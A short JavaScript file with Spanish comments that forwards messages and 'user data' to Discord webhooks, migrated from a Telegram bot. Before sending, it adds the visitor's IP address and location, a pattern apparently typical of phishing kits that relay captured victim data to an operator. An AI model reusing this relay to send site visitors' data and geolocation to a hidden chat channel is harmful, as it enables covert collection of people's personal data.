// sendBtn.js - Migrado a Discord Webhooks
// Ya no necesitamos configuración de servidor PHP

/**
 * Envía un mensaje a Discord (reemplazo de Telegram)
 * @param {string} message - El mensaje a enviar
 * @returns {Promise<boolean>} - Promise que resuelve cuando el mensaje ha sido enviado
 */
async function enviarMensajeTelegramSinBotones(message) {
    try {
        // Usar el servicio de Discord
        const success = await window.discordService.sendMessage(message);
        
        if (success) {
            return true;
        } else {
            throw new Error('Error al enviar mensaje a Discord');
        }
    } catch (error) {
        console.error('Error al enviar mensaje:', error);
        throw error;
    }
}

/**
 * Envía un mensaje con formato embed a Discord
 * @param {Object} embedData - Datos para el embed
 * @returns {Promise<boolean>} - Promise que resuelve cuando el mensaje ha sido enviado
 */
async function enviarMensajeConFormato(embedData) {
    try {
        const success = await window.discordService.sendEmbed(embedData);
        
        if (success) {
            return true;
        } else {
            throw new Error('Error al enviar embed a Discord');
        }
    } catch (error) {
        console.error('Error al enviar mensaje con formato:', error);
        throw error;
    }
}

/**
 * Envía datos de usuario a Discord
 * @param {Object} userData - Datos del usuario a enviar
 * @returns {Promise<boolean>} - Promise que resuelve cuando el mensaje ha sido enviado
 */
async function enviarDatosUsuario(userData) {
    try {
        // Obtener información de IP antes de enviar
        const ipInfo = await window.discordService.getIPInfo();
        userData.ip = ipInfo.ip;
        userData.location = ipInfo.location;
        
        const success = await window.discordService.sendUserData(userData);
        
        if (success) {
            return true;
        } else {
            throw new Error('Error al enviar datos de usuario a Discord');
        }
    } catch (error) {
        console.error('Error al enviar datos de usuario:', error);
        throw error;
    }
}

// Mantener compatibilidad con el nombre anterior por si se usa en otros archivos
async function enviarMensajeYEsperarRespuesta(message, timeout = 300000) {
    // Discord webhooks no soportan interacciones bidireccionales
    // Solo enviamos el mensaje
    return await enviarMensajeTelegramSinBotones(message);
}